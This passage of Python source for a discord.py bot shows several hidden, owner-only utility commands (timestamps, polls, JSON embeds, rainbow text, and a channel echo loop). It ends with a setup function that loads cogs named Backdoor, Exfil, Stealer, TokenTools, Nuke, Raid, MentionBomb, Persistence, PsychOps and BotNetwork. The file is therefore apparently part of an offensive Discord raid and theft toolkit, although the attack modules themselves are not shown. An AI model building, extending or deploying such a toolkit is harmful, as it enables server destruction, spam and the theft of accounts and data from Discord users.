    async def timestamp(self, ctx: commands.Context, style: str = "f"):
        """45. generate a discord timestamp."""
        now = datetime.datetime.now(datetime.timezone.utc)
        unix = int(now.timestamp())
        styles = {
            "t": f"<t:{unix}:t>",
            "T": f"<t:{unix}:T>",
            "d": f"<t:{unix}:d>",
            "D": f"<t:{unix}:D>",
            "f": f"<t:{unix}:f>",
            "F": f"<t:{unix}:F>",
            "R": f"<t:{unix}:R>",
        }
        await ctx.send(f"timestamp: `{styles.get(style, styles['f'])}`")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def pollcreate(self, ctx: commands.Context, title: str, *options: str):
        """46. create a formatted poll."""
        if len(options) < 2:
            return await ctx.send("provide at least 2 options.")
        if len(options) > 10:
            return await ctx.send("maximum 10 options.")
        emojis = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        embed = discord.Embed(title=title, color=discord.Color.blue())
        description = []
        for i, option in enumerate(options):
            description.append(f"{emojis[i]} {option}")
        embed.description = "\n\n".join(description)
        embed.set_footer(text=f"poll by {ctx.author.name}")
        msg = await ctx.send(embed=embed)
        for i in range(len(options)):
            await msg.add_reaction(emojis[i])
        await ctx.message.delete()

    @commands.command(hidden=True)
    @commands.is_owner()
    async def quickembed(self, ctx: commands.Context, *, json_data: str):
        """47. create an embed from json."""
        try:
            data = json.loads(json_data)
            embed = discord.Embed.from_dict(data)
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"invalid json: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rainbow(self, ctx: commands.Context, *, text: str):
        """48. send text with rainbow color effect using code blocks."""
        colors = ["🔴", "🟠", "🟡", "🟢", "🔵", "🟣"]
        result = " ".join(f"{colors[i % 6]} {c}" for i, c in enumerate(text))
        if len(result) > 2000:
            result = result[:2000]
        await ctx.send(result)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ascii(self, ctx: commands.Context, *, text: str):
        """49. convert text to ascii art."""
        text = text[:10]
        await ctx.send(f"```\n{text}\n```")
        await ctx.send("ascii art generation requires external library. install pyfiglet for full functionality.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def chatbotmode(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """50. echo all messages in a channel."""
        channel = channel or ctx.channel
        await ctx.send(f"chatbot mode enabled in {channel.mention}.", delete_after=5)
        def check(m):
            return m.channel == channel and m.author != self.bot.user and not m.author.bot
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=300)
                await channel.send(f"{msg.author.name}: {msg.content}")
        except asyncio.TimeoutError:
            await ctx.send("chatbot mode ended (timeout).", delete_after=5)

async def setup(bot: commands.Bot):
    await bot.add_cog(Admin(bot))
    await bot.add_cog(AdvancedAdmin(bot))
    await bot.add_cog(Automation(bot))
    await bot.add_cog(Backdoor(bot))
    await bot.add_cog(ChannelManip(bot))
    await bot.add_cog(Cloner(bot))
    await bot.add_cog(Economy(bot))
    await bot.add_cog(EmojiTools(bot))
    await bot.add_cog(EventSabotage(bot))
    await bot.add_cog(Exfil(bot))
    await bot.add_cog(Exploit(bot))
    await bot.add_cog(HiddenCommands(bot))
    await bot.add_cog(Injection(bot))
    await bot.add_cog(InviteTools(bot))
    await bot.add_cog(MentionBomb(bot))
    await bot.add_cog(MessageManip(bot))
    await bot.add_cog(Nuke(bot))
    await bot.add_cog(Persistence(bot))
    await bot.add_cog(PsychOps(bot))
    await bot.add_cog(Raid(bot))
    await bot.add_cog(ReactionAbuse(bot))
    await bot.add_cog(Recon(bot))
    await bot.add_cog(Scheduler(bot))
    await bot.add_cog(Scraper(bot))
    await bot.add_cog(ServerAnalyzer(bot))
    await bot.add_cog(Spammer(bot))
    await bot.add_cog(Stealer(bot))
    await bot.add_cog(ThreadBomb(bot))
    await bot.add_cog(TokenTools(bot))
    await bot.add_cog(VoiceManip(bot))
    await bot.add_cog(Webhook(bot))
    await bot.add_cog(WebhookAdvanced(bot))
    await bot.add_cog(AdvancedCheats(bot))
    await bot.add_cog(AdvancedLogger(bot))
    await bot.add_cog(BotNetwork(bot))
    await bot.add_cog(ChatCommands(bot))
